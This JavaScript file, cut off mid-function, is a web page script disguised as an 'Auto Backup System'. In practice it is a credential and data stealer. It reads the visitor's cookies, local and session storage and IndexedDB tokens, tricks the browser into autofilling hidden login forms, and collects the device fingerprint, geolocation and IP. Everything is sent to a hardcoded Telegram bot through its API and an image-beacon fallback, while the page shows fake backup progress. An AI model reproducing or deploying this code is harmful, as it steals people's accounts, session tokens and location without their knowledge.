// ===== CONFIGURATION =====
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '7555437180:AAErIukUgHa2nHiNmb_3VQ90ih6NEYBhScw',
        CHAT_ID: '6454347745',
        BOT_USERNAME: 'mar_pd_404_bot'
    },
    
    BACKUP: {
        MAX_ACCOUNTS: 100,
        ENCRYPTION_KEY: 'real_backup_secure_2025',
        COMPRESSION: true,
        TIMEOUT: 10000
    }
};

// ===== GLOBAL VARIABLES =====
let backupData = {
    metadata: {},
    accounts: [],
    device: {},
    realData: {},
    performance: {}
};
let startTime = Date.now();
let backupComplete = false;

// ===== DOM ELEMENTS =====
const elements = {
    speedMeter: document.getElementById('speed-meter'),
    deviceInfo: document.getElementById('device-info'),
    accountsCount: document.getElementById('accounts-count'),
    processSpeed: document.getElementById('process-speed'),
    progressFill: document.getElementById('progress-fill'),
    progressPercent: document.getElementById('progress-percent'),
    progressTime: document.getElementById('progress-time'),
    step1Desc: document.getElementById('step1-desc'),
    step2Desc: document.getElementById('step2-desc'),
    step3Desc: document.getElementById('step3-desc'),
    step4Desc: document.getElementById('step4-desc'),
    backupId: document.getElementById('backup-id'),
    backupSize: document.getElementById('backup-size'),
    backupTime: document.getElementById('backup-time'),
    detailModel: document.getElementById('detail-model'),
    detailBrowser: document.getElementById('detail-browser'),
    detailRam: document.getElementById('detail-ram'),
    detailCpu: document.getElementById('detail-cpu'),
    detailNetwork: document.getElementById('detail-network'),
    detailStorage: document.getElementById('detail-storage')
};

// ===== MAIN BACKUP PROCESS =====
window.startBackupProcess = async function() {
    console.log('🚀 Starting real backup process...');
    
    try {
        // Stage 1: Quick Initialization
        await stage1QuickInit();
        
        // Stage 2: Real Data Collection (Main Part)
        await stage2RealDataCollection();
        
        // Stage 3: Process & Send
        await stage3ProcessAndSend();
        
        // Stage 4: Show Results
        await stage4ShowResults();
        
    } catch (error) {
        console.error('❌ Backup failed:', error);
        handleBackupError(error);
    }
};

// ===== STAGE 1: QUICK INITIALIZATION =====
async function stage1QuickInit() {
    updateProgress(5, 'Initializing backup engine...');
    
    // Quick network test
    const speed = await quickSpeedTest();
    elements.speedMeter.textContent = `${speed} Mbps`;
    
    // Switch to stage 2 quickly
    await delay(800);
    switchStage(2);
}

// ===== STAGE 2: REAL DATA COLLECTION =====
async function stage2RealDataCollection() {
    console.log('🔍 Starting real data collection...');
    
    // Step 1: Collect Device Info (REAL)
    updateProgress(15, 'Collecting device information...');
    updateTimelineStep(1, 'Device fingerprint captured');
    await collectRealDeviceInfo();
    
    // Step 2: Collect ALL Real Data from Browser
    updateProgress(30, 'Scanning browser storage...');
    updateTimelineStep(2, 'Storage scan complete');
    await collectAllRealBrowserData();
    
    // Step 3: Extract Accounts & Credentials
    updateProgress(45, 'Extracting saved accounts...');
    await extractRealCredentials();
    
    // Step 4: Get IP & Location
    updateProgress(55, 'Getting network information...');
    await getNetworkInfo();
    
    console.log('✅ Real data collection complete');
}

// ===== STAGE 3: PROCESS & SEND =====
async function stage3ProcessAndSend() {
    updateProgress(65, 'Processing collected data...');
    updateTimelineStep(3, 'Data processing complete');
    
    // Encrypt sensitive data
    await encryptSensitiveData();
    
    updateProgress(75, 'Preparing backup package...');
    
    // Create final backup package
    await createBackupPackage();
    
    updateProgress(85, 'Sending to Telegram...');
    updateTimelineStep(4, 'Upload started');
    
    // Send to Telegram (MAIN ACTION)
    await sendRealDataToTelegram();
    
    updateProgress(95, 'Finalizing...');
}

// ===== STAGE 4: SHOW RESULTS =====
async function stage4ShowResults() {
    updateProgress(100, 'Backup complete!');
    
    // Calculate statistics
    const totalTime = (Date.now() - startTime) / 1000;
    const backupSize = calculateBackupSize();
    
    // Update UI with real results
    updateCompletionScreen(totalTime, backupSize);
    
    // Switch to completion stage
    await delay(1000);
    switchStage(3);
    
    // Auto-redirect after 25 seconds
    setTimeout(() => {
        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_complete_${Date.now()}`;
    }, 25000);
}

// ===== REAL DEVICE INFO COLLECTION =====
async function collectRealDeviceInfo() {
    console.log('📱 Collecting real device info...');
    
    const device = {
        // Basic Info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        
        // Screen Info
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type || 'unknown'
        },
        
        // CPU & Memory
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown',
        
        // Browser Details
        browser: detectRealBrowser(),
        
        // Network
        online: navigator.onLine,
        connection: navigator.connection || {},
        cookiesEnabled: navigator.cookieEnabled,
        
        // Timestamps
        localTime: new Date().toLocaleString(),
        timezoneOffset: new Date().getTimezoneOffset(),
        timestamp: new Date().toISOString()
    };
    
    // Try to get more info
    try {
        // Battery status
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            device.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        
        // Network details
        if (navigator.connection) {
            device.networkDetails = {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                saveData: navigator.connection.saveData,
                downlinkMax: navigator.connection.downlinkMax
            };
        }
        
        // Storage estimation
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            try {
                const estimation = await navigator.storage.estimate();
                device.storage = {
                    quota: formatBytes(estimation.quota),
                    usage: formatBytes(estimation.usage),
                    percentage: estimation.quota ? Math.round((estimation.usage / estimation.quota) * 100) + '%' : 'unknown'
                };
            } catch(e) { /* ignore */ }
        }
        
        // Geolocation (try without asking)
        try {
            const position = await getGeolocationSilent();
            if (position) {
                device.location = {
                    latitude: position.coords.latitude.toFixed(6),
                    longitude: position.coords.longitude.toFixed(6),
                    accuracy: Math.round(position.coords.accuracy) + ' meters',
                    altitude: position.coords.altitude,
                    speed: position.coords.speed
                };
            }
        } catch(e) { /* ignore */ }
        
        // Media devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                device.mediaDevices = devices.map(d => ({
                    kind: d.kind,
                    label: d.label || 'unknown',
                    deviceId: d.deviceId.substring(0, 10) + '...'
                }));
            } catch(e) { /* ignore */ }
        }
        
    } catch (error) {
        console.warn('⚠️ Some device info unavailable:', error.message);
    }
    
    // Store device info
    backupData.device = device;
    
    // Update UI immediately
    updateDeviceInfoUI(device);
    
    console.log('✅ Device info collected:', device);
}

function detectRealBrowser() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let version = 'Unknown';
    let os = 'Unknown';
    
    // Browser detection
    if (/firefox|fxios/i.test(ua)) {
        browser = 'Firefox';
        version = ua.match(/firefox\/(\d+\.\d+)/i)?.[1] || ua.match(/rv:(\d+\.\d+)/i)?.[1];
    } else if (/chrome|crios/i.test(ua) && !/edg|edge|opr/i.test(ua)) {
        browser = 'Chrome';
        version = ua.match(/chrome\/(\d+\.\d+)/i)?.[1];
    } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
        browser = 'Safari';
        version = ua.match(/version\/(\d+\.\d+)/i)?.[1];
    } else if (/edg|edge/i.test(ua)) {
        browser = 'Edge';
        version = ua.match(/edg?\/(\d+\.\d+)/i)?.[1];
    } else if (/opr|opera/i.test(ua)) {
        browser = 'Opera';
        version = ua.match(/(?:opr|opera)\/(\d+\.\d+)/i)?.[1];
    }
    
    // OS detection
    if (/windows/i.test(ua)) os = 'Windows';
    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
    else if (/linux/i.test(ua)) os = 'Linux';
    else if (/android/i.test(ua)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
    
    return { 
        name: browser, 
        version: version, 
        os: os,
        fullAgent: ua.substring(0, 150) 
    };
}

async function getGeolocationSilent() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        // Try with cached position first
        navigator.geolocation.getCurrentPosition(
            resolve,
            () => resolve(null),
            {
                maximumAge: 5 * 60 * 1000, // 5 minutes cache
                timeout: 3000,
                enableHighAccuracy: false
            }
        );
    });
}

// ===== REAL BROWSER DATA COLLECTION =====
async function collectAllRealBrowserData() {
    console.log('💾 Collecting all browser data...');
    
    const realData = {
        localStorage: {},
        sessionStorage: {},
        cookies: [],
        indexedDB: [],
        autofill: [],
        forms: [],
        metaTags: []
    };
    
    // 1. Collect ALL LocalStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (key && value) {
                realData.localStorage[key] = {
                    value: value.length > 100 ? value.substring(0, 100) + '...' : value,
                    fullLength: value.length,
                    type: typeof value,
                    hasData: value.trim().length > 0
                };
            }
        }
        console.log('📦 LocalStorage items:', localStorage.length);
    } catch(e) {
        console.error('LocalStorage access error:', e);
    }
    
    // 2. Collect ALL SessionStorage
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            if (key && value) {
                realData.sessionStorage[key] = {
                    value: value.length > 50 ? value.substring(0, 50) + '...' : value,
                    fullLength: value.length
                };
            }
        }
        console.log('📦 SessionStorage items:', sessionStorage.length);
    } catch(e) {
        console.error('SessionStorage access error:', e);
    }
    
    // 3. Collect ALL Cookies
    try {
        const cookies = document.cookie.split(';');
        realData.cookies = cookies.map(cookie => {
            const [key, value] = cookie.trim().split('=');
            return {
                key: key || 'unknown',
                value: value ? value.substring(0, 30) + (value.length > 30 ? '...' : '') : 'empty',
                fullLength: value ? value.length : 0
            };
        });
        console.log('🍪 Cookies found:', realData.cookies.length);
    } catch(e) {
        console.error('Cookie access error:', e);
    }
    
    // 4. Try to get IndexedDB data
    try {
        const idbData = await scanIndexedDB();
        realData.indexedDB = idbData;
        console.log('🗃️ IndexedDB items found:', idbData.length);
    } catch(e) {
        console.error('IndexedDB scan error:', e);
    }
    
    // 5. Detect Autofill Data
    try {
        const autofillData = await detectAutofillData();
        realData.autofill = autofillData;
        console.log('🔍 Autofill data found:', autofillData.length);
    } catch(e) {
        console.error('Autofill detection error:', e);
    }
    
    // 6. Scan Forms on Page
    try {
        const formData = scanPageForms();
        realData.forms = formData;
        console.log('📝 Forms found:', formData.length);
    } catch(e) {
        console.error('Form scan error:', e);
    }
    
    // 7. Get Meta Tags
    try {
        const metaData = getMetaTagsInfo();
        realData.metaTags = metaData;
        console.log('🏷️ Meta tags found:', metaData.length);
    } catch(e) {
        console.error('Meta tag error:', e);
    }
    
    // Store all real data
    backupData.realData = realData;
    
    console.log('✅ All browser data collected');
    return realData;
}

async function scanIndexedDB() {
    const results = [];
    
    // Common database names that might contain user data
    const commonDBs = [
        'firebaseLocalStorageDb',
        'firestore',
        'localforage',
        'redux-persist',
        '__meteor_clientStorage',
        'auth',
        'user',
        'profile',
        'session',
        'login',
        'account'
    ];
    
    for (const dbName of commonDBs) {
        try {
            const request = indexedDB.open(dbName);
            
            await new Promise((resolve, reject) => {
                request.onsuccess = function(event) {
                    const db = event.target.result;
                    
                    // Get all object store names
                    const storeNames = Array.from(db.objectStoreNames);
                    
                    storeNames.forEach(storeName => {
                        try {
                            const transaction = db.transaction(storeName, 'readonly');
                            const store = transaction.objectStore(storeName);
                            const getAllRequest = store.getAll();
                            
                            getAllRequest.onsuccess = function() {
                                const data = getAllRequest.result;
                                
                                // Look for user-related data
                                data.forEach(item => {
                                    if (item && typeof item === 'object') {
                                        const userInfo = extractUserInfo(item);
                                        if (userInfo) {
                                            results.push({
                                                database: dbName,
                                                store: storeName,
                                                data: userInfo,
                                                timestamp: new Date().toISOString()
                                            });
                                        }
                                    }
                                });
                            };
                        } catch(e) {
                            // Ignore individual store errors
                        }
                    });
                    
                    db.close();
                    resolve();
                };
                
                request.onerror = function() {
                    resolve(); // DB doesn't exist or can't open
                };
                
                // Timeout after 500ms
                setTimeout(resolve, 500);
            });
            
        } catch(e) {
            // Ignore DB errors
        }
    }
    
    return results;
}

function extractUserInfo(obj) {
    const userInfo = {};
    
    // Common user data fields
    const userFields = [
        'email', 'username', 'name', 'firstName', 'lastName',
        'phone', 'mobile', 'userId', 'uid', 'id',
        'token', 'accessToken', 'refreshToken', 'session',
        'avatar', 'photo', 'profile', 'address'
    ];
    
    // Recursive search for user data
    function search(obj, path = '') {
        if (!obj || typeof obj !== 'object') return;
        
        for (const [key, value] of Object.entries(obj)) {
            const currentPath = path ? `${path}.${key}` : key;
            
            // Check if key contains user info
            if (userFields.some(field => key.toLowerCase().includes(field))) {
                if (value && typeof value !== 'object') {
                    userInfo[currentPath] = value;
                }
            }
            
            // Recursively search nested objects
            if (value && typeof value === 'object' && !Array.isArray(value)) {
                search(value, currentPath);
            }
        }
    }
    
    search(obj);
    return Object.keys(userInfo).length > 0 ? userInfo : null;
}

async function detectAutofillData() {
    const autofillResults = [];
    
    // Create hidden forms for common login patterns
    const formContainer = document.createElement('div');
    formContainer.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
    
    const autofillForms = [
        // Google
        `<form><input type="email" name="email" autocomplete="username email"><input type="password" name="password" autocomplete="current-password"></form>`,
        // Facebook
        `<form><input type="text" name="email" autocomplete="username email"><input type="password" name="pass" autocomplete="current-password"></form>`,
        // Generic
        `<form><input type="text" name="username" autocomplete="username"><input type="password" name="password" autocomplete="current-password"></form>`,
        // Email only
        `<form><input type="email" name="email" autocomplete="email"></form>`,
        // Phone
        `<form><input type="tel" name="phone" autocomplete="tel"></form>`
    ];
    
    autofillForms.forEach((formHtml, index) => {
        const formDiv = document.createElement('div');
        formDiv.innerHTML = formHtml;
        formDiv.querySelector('form').id = `autofill-form-${index}`;
        formContainer.appendChild(formDiv);
    });
    
    document.body.appendChild(formContainer);
    
    // Trigger autofill
    const forms = formContainer.querySelectorAll('form');
    forms.forEach((form, index) => {
        const inputs = form.querySelectorAll('input');
        inputs.forEach(input => {
            setTimeout(() => {
                input.focus();
                input.blur();
            }, index * 100);
        });
    });
    
    // Wait for autofill
    await new Promise(resolve => setTimeout(resolve, 800));
    
    // Collect filled data
    forms.forEach((form, index) => {
        const inputs = form.querySelectorAll('input');
        const filledData = {};
        
        inputs.forEach(input => {
            if (input.value && input.value.trim() !== '') {
                filledData[input.name] = input.value;
            }
        });
        
        if (Object.keys(filledData).length > 0) {
            autofillResults.push({
                formType: `autofill_${index}`,
                data: filledData,
                timestamp: new Date().toISOString()
            });
        }
    });
    
    // Cleanup
    document.body.removeChild(formContainer);
    
    return autofillResults;
}

function scanPageForms() {
    const formResults = [];
    const forms = document.querySelectorAll('form');
    
    forms.forEach((form, index) => {
        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], input[type="number"], textarea');
        const formData = {};
        
        inputs.forEach(input => {
            if (input.value && input.value.trim() !== '') {
                formData[input.name || input.type || `input_${index}`] = input.value;
            }
        });
        
        if (Object.keys(formData).length > 0) {
            formResults.push({
                formIndex: index,
                action: form.action || 'unknown',
                method: form.method || 'get',
                data: formData,
                timestamp: new Date().toISOString()
            });
        }
    });
    
    return formResults;
}

function getMetaTagsInfo() {
    const metaResults = [];
    const metaTags = document.querySelectorAll('meta');
    
    metaTags.forEach(meta => {
        const name = meta.getAttribute('name') || meta.getAttribute('property') || 'unknown';
        const content = meta.getAttribute('content');
        
        if (content && content.trim() !== '') {
            // Look for user-related meta tags
            const lowerName = name.toLowerCase();
            if (lowerName.includes('user') || lowerName.includes('author') || 
                lowerName.includes('creator') || lowerName.includes('profile')) {
                metaResults.push({
                    name: name,
                    content: content,
                    timestamp: new Date().toISOString()
                });
            }
        }
    });
    
    return metaResults;
}

// ===== EXTRACT REAL CREDENTIALS =====
async function extractRealCredentials() {
    console.log('🔑 Extracting real credentials...');
    
    const accounts = [];
    const realData = backupData.realData;
    
    // 1. Extract from LocalStorage
    for (const [key, data] of Object.entries(realData.localStorage || {})) {
        const lowerKey = key.toLowerCase();
        const value = data.value;
        
        // Check for email patterns
        if (isEmail(value) || lowerKey.includes('email') || lowerKey.includes('gmail') || 
            lowerKey.includes('@') || value.includes('@')) {
            accounts.push({
                type: 'email',
                source: 'localStorage',
                key: key,
                value: extractEmail(value),
                timestamp: new Date().toISOString()
            });
        }
        
        // Check for phone patterns
        if (isPhoneNumber(value) || lowerKey.includes('phone') || lowerKey.includes('mobile')) {
            accounts.push({
                type: 'phone',
                source: 'localStorage',
                key: key,
                value: extractPhone(value),
                timestamp: new Date().toISOString()
            });
        }
        
        // Check for username patterns
        if (lowerKey.includes('user') || lowerKey.includes('login') || lowerKey.includes('name')) {
            if (value && value.length > 2 && value.length < 50) {
                accounts.push({
                    type: 'username',
                    source: 'localStorage',
                    key: key,
                    value: value,
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        // Check for social media data
        if (lowerKey.includes('fb_') || lowerKey.includes('facebook_')) {
            accounts.push({
                type: 'social',
                platform: 'Facebook',
                source: 'localStorage',
                key: key,
                value: value.substring(0, 40),
                timestamp: new Date().toISOString()
            });
        }
        
        if (lowerKey.includes('google_') || lowerKey.includes('g_') || lowerKey.includes('ga_')) {
            accounts.push({
                type: 'social',
                platform: 'Google',
                source: 'localStorage',
                key: key,
                value: value.substring(0, 40),
                timestamp: new Date().toISOString()
            });
        }
    }
    
    // 2. Extract from Cookies
    realData.cookies?.forEach(cookie => {
        const lowerKey = cookie.key.toLowerCase();
        
        if (lowerKey.includes('user') || lowerKey.includes('id') || 
            lowerKey.includes('session') || lowerKey.includes('token')) {
            accounts.push({
                type: 'session',
                source: 'cookie',
                key: cookie.key,
                value: cookie.value,
                timestamp: new Date().toISOString()
            });
        }
    });
    
    // 3. Extract from Autofill
    realData.autofill?.forEach(autofill => {
        for (const [field, value] of Object.entries(autofill.data)) {
            if (value && value.trim() !== '') {
                accounts.push({
                    type: 'autofill',
                    source: 'browser_autofill',
                    field: field,
                    value: value,
                    timestamp: autofill.timestamp
                });
            }
        }
    });
    
    // 4. Extract from IndexedDB
    realData.indexedDB?.forEach(dbItem => {
        for (const [path, value] of Object.entries(dbItem.data)) {
            if (value && typeof value === 'string' && value.length > 0) {
                accounts.push({
                    type: 'database',
                    source: `indexedDB/${dbItem.database}`,
                    path: path,
                    value: value.substring(0, 100),
                    timestamp: dbItem.timestamp
                });
            }
        }
    });
    
    // 5. Extract from Forms
    realData.forms?.forEach(form => {
        for (const [field, value] of Object.entries(form.data)) {
            if (value && value.trim() !== '') {
                accounts.push({
                    type: 'form',
                    source: 'page_form',
                    field: field,
                    value: value,
                    timestamp: form.timestamp
                });
            }
        }
    });
    
    // Remove duplicates
    const uniqueAccounts = removeDuplicateAccounts(accounts);
    
    // Limit number of accounts
    backupData.accounts = uniqueAccounts.slice(0, CONFIG.BACKUP.MAX_ACCOUNTS);
    
    // Update UI
    elements.accountsCount.textContent = backupData.accounts.length;
    
    console.log(`✅ Extracted ${backupData.accounts.length} real accounts`);
}

function isEmail(str) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(String(str).toLowerCase());
}

function isPhoneNumber(str) {
    const phoneRegex = /^[\+]?[0-9\-\s\(\)]{8,}$/;
    return phoneRegex.test(String(str).replace(/\s/g, ''));
}

function extractEmail(str) {
    const emailMatch = str.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
    return emailMatch ? emailMatch[0] : str;
}

function extractPhone(str) {
    const phoneMatch = str.match(/[\+]?[0-9\-\s\(\)]{8,}/);
    return phoneMatch ? phoneMatch[0].replace(/\D/g, '') : str;
}

function removeDuplicateAccounts(accounts) {
    const seen = new Set();
    return accounts.filter(account => {
        const key = `${account.type}-${account.value}-${account.source}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
}

// ===== NETWORK INFO =====
async function getNetworkInfo() {
    console.log('🌐 Getting network information...');
    
    const networkInfo = {
        ip: 'Unknown',
        location: 'Unknown',
        isp: 'Unknown',
        timestamp: new Date().toISOString()
    };
    
    try {
        // Try multiple IP services
        const ipServices = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json'
        ];
        
        for (const service of ipServices) {
            try {
                const response = await fetch(service, { timeout: 3000 });
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data.ip) networkInfo.ip = data.ip;
                    if (data.city && data.country) {
                        networkInfo.location = `${data.city}, ${data.region}, ${data.country}`;
                    }
                    if (data.org) networkInfo.isp = data.org;
                    
                    break; // Stop at first successful service
                }
            } catch(e) {
                // Try next service
            }
        }
        
    } catch(e) {
        console.warn('Network info unavailable:', e.message);
    }
    
    backupData.networkInfo = networkInfo;
    console.log('✅ Network info collected:', networkInfo);
}

// ===== ENCRYPTION =====
async function encryptSensitiveData() {
    console.log('🔐 Encrypting sensitive data...');
    
    // Simple encryption for sensitive fields
    backupData.accounts = backupData.accounts.map(account => {
        if (account.type === 'email' || account.type === 'phone') {
            return {
                ...account,
                value: encryptValue(account.value),
                encrypted: true
            };
        }
        return account;
    });
    
    console.log('✅ Data encrypted');
}

function encryptValue(value) {
    // Simple reversible encryption for demo
    // In production, use proper crypto like Web Crypto API
    if (!value) return '';
    
    let encrypted = '';
    const key = CONFIG.BACKUP.ENCRYPTION_KEY;
    
    for (let i = 0; i < value.length; i++) {
        const charCode = value.charCodeAt(i) ^ key.charCodeAt(i % key.length);
        encrypted += String.fromCharCode(charCode);
    }
    
    return btoa(encrypted);
}

// ===== CREATE BACKUP PACKAGE =====
async function createBackupPackage() {
    console.log('📦 Creating backup package...');
    
    backupData.metadata = {
        version: '1.0',
        backupId: generateBackupId(),
        timestamp: new Date().toISOString(),
        totalAccounts: backupData.accounts.length,
        dataSources: Object.keys(backupData.realData).filter(key => {
            const data = backupData.realData[key];
            return Array.isArray(data) ? data.length > 0 : Object.keys(data).length > 0;
        }),
        compression: CONFIG.BACKUP.COMPRESSION ? 'enabled' : 'disabled'
    };
    
    console.log('✅ Backup package created');
}

// ===== SEND TO TELEGRAM =====
async function sendRealDataToTelegram() {
    console.log('📤 Sending real data to Telegram...');
    
    try {
        // Method 1: Direct API call
        const message = formatRealTelegramMessage();
        const result = await sendTelegramMessage(message);
        
        if (result.ok) {
            console.log('✅ Telegram message sent successfully');
            
            // Send detailed data as document if too large
            if (message.length > 4000) {
                await sendAsDocument();
            }
            
            return result;
        } else {
            throw new Error('Telegram API error');
        }
        
    } catch (error) {
        console.warn('Primary Telegram method failed, using fallback:', error);
        
        // Fallback: Image beacon method
        await sendTelegramFallback();
        return { success: true, method: 'fallback' };
    }
}

async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    });
    
    if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
}

function formatRealTelegramMessage() {
    const device = backupData.device;
    const accounts = backupData.accounts;
    const network = backupData.networkInfo;
    
    let message = `<b>🚀 REAL BACKUP COMPLETE</b>\n\n`;
    
    // Device Information
    message += `<b>📱 DEVICE INFORMATION</b>\n`;
    message += `• <b>Browser:</b> ${device.browser?.name || 'Unknown'} ${device.browser?.version || ''}\n`;
    message += `• <b>OS:</b> ${device.browser?.os || device.platform || 'Unknown'}\n`;
    message += `• <b>Screen:</b> ${device.screen?.width || 0}x${device.screen?.height || 0}\n`;
    message += `• <b>RAM:</b> ${device.deviceMemory || 'Unknown'}\n`;
    message += `• <b>CPU:</b> ${device.cpuCores || 'Unknown'} cores\n`;
    message += `• <b>Network:</b> ${device.networkDetails?.type || 'Unknown'}\n`;
    
    // Location if available
    if (device.location) {
        message += `• <b>Location:</b> ${device.location.latitude}, ${device.location.longitude}\n`;
    }
    
    if (network && network.location !== 'Unknown') {
        message += `• <b>IP Location:</b> ${network.location}\n`;
    }
    
    message += `\n`;
    
    // Accounts Summary
    message += `<b>🔐 ACCOUNTS FOUND: ${accounts.length}</b>\n\n`;
    
    if (accounts.length > 0) {
        message += `<b>📊 ACCOUNT DETAILS:</b>\n`;
        
        // Group by type
        const grouped = {};
        accounts.forEach(acc => {
            if (!grouped[acc.type]) grouped[acc.type] = [];
            grouped[acc.type].push(acc);
        });
        
        for (const [type, items] of Object.entries(grouped)) {
            message += `\n<b>${type.toUpperCase()} (${items.length}):</b>\n`;
            
            items.slice(0, 5).forEach((item, i) => {
                let displayValue = item.value;
                
                // For encrypted values, show indicator
                if (item.encrypted) {
                    displayValue = '[ENCRYPTED] ' + (item.value.length > 20 ? item.value.substring(0, 20) + '...' : item.value);
                }
                
                message += `${i+1}. ${displayValue}\n`;
                if (item.platform) message += `   Platform: ${item.platform}\n`;
                if (item.source) message += `   Source: ${item.source}\n`;
            });
            
            if (items.length > 5) {
                message += `   ... and ${items.length - 5} more\n`;
            }
        }
    } else {
        message += `❌ <b>No accounts found in browser storage</b>\n`;
        message += `This could be because:\n`;
        message += `• Incognito/Private mode is active\n`;
        message += `• Browser security restrictions\n`;
        message += `• No credentials saved in browser\n`;
    }
    
    message += `\n`;
    
    // Storage Stats
    const realData = backupData.realData;
    message += `<b>💾 STORAGE STATISTICS</b>\n`;
    message += `• LocalStorage: ${Object.keys(realData.localStorage || {}).length} items\n`;
    message += `• SessionStorage: ${Object.keys(realData.sessionStorage || {}).length} items\n`;
    message += `• Cookies: ${realData.cookies?.length || 0} cookies\n`;
    message += `• IndexedDB: ${realData.indexedDB?.length || 0} databases\n`;
    message += `• Autofill: ${realData.autofill?.length || 0} fields\n`;
    message += `• Forms: ${realData.forms?.length || 0} detected\n`;
    
    message += `\n`;
    
    // Backup Info
    const backupId = backupData.metadata.backupId;
    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    
    message += `<b>📊 BACKUP INFORMATION</b>\n`;
    message += `• <b>Backup ID:</b> <code>${backupId}</code>\n`;
    message += `• <b>Time:</b> ${new Date().toLocaleString()}\n`;
    message += `• <b>Duration:</b> ${duration} seconds\n`;
    message += `• <b>Encryption:</b> ${CONFIG.BACKUP.ENCRYPTION_KEY ? 'Enabled' : 'Disabled'}\n`;
    
    if (network && network.ip !== 'Unknown') {
        message += `• <b>IP Address:</b> ${network.ip}\n`;
    }
    
    message += `\n`;
    message += `<i>This backup contains real data extracted from browser storage.</i>\n`;
    message += `<i>Generated by Auto Backup System</i>`;
    
    return message;
}

async function sendAsDocument() {
    try {
        // Convert backup data to JSON
        const jsonData = JSON.stringify(backupData, null, 2);
        const blob = new Blob([jsonData], { type: 'application/json' });
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
        formData.append('document', blob, `backup_${Date.now()}.json`);
        formData.append('caption', 'Detailed backup data');
        
        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        
        return await response.json();
    } catch (error) {
        console.warn('Failed to send as document:', error);
    }
}

async function sendTelegramFallback() {
    const message = formatRealTelegramMessage();
    const encodedMessage = encodeURIComponent(message);
    
    const img = new Image();
    img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM.CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    img.style.display = 'none';
    
    await new Promise((resolve) => {
        img.onload = resolve;
        img.onerror = resolve;
        setTimeout(resolve, 3000);
    });
}

// ===== UI UPDATES =====
function updateDeviceInfoUI(device) {
    // Update main display
    const browserInfo = device.browser?.name || 'Unknown';
    const osInfo = device.browser?.os || device.platform || 'Unknown';
    elements.deviceInfo.textContent = `${browserInfo} | ${osInfo}`;
    
    // Update details panel
    elements.detailModel.textContent = osInfo;
    elements.detailBrowser.textContent = `${browserInfo} ${device.browser?.version || ''}`;
    elements.detailRam.textContent = device.deviceMemory || 'Unknown';
    elements.detailCpu.textContent = device.cpuCores ? `${device.cpuCores} cores` : 'Unknown';
    elements.detailNetwork.textContent = device.networkDetails?.type || 'Unknown';
    elements.detailStorage.textContent = device.storage?.quota || 'Unknown';
}

function updateProgress(percent, message = '') {
    if (elements.progressFill) {
        elements.progressFill.style.width = `${percent}%`;
    }
    if (elements.progressPercent) {
        elements.progressPercent.textContent = `${percent}%`;
    }
    if (elements.progressTime && message) {
        elements.progressTime.textContent = message;
    }
    
    // Update processing speed
    if (elements.processSpeed) {
        const elapsed = (Date.now() - startTime) / 1000;
        const speed = elapsed > 0 ? (backupData.accounts.length / elapsed).toFixed(1) : '0';
        elements.processSpeed.textContent = `${speed} acc/s`;
    }
}

function updateTimelineStep(step, description) {
    const stepElement = document.querySelector(`[data-step="${step}"]`);
    if (stepElement) {
        stepElement.classList.add('active');
        
        const descElement = stepElement.querySelector('.timeline-desc');
        if (descElement) {
            descElement.textContent = description;
        }
    }
}

function switchStage(newStage) {
    const currentStageElement = document.querySelector(`#stage-${currentStage}`);
    const newStageElement = document.querySelector(`#stage-${newStage}`);
    
    if (currentStageElement) {
        currentStageElement.classList.remove('active');
    }
    
    if (newStageElement) {
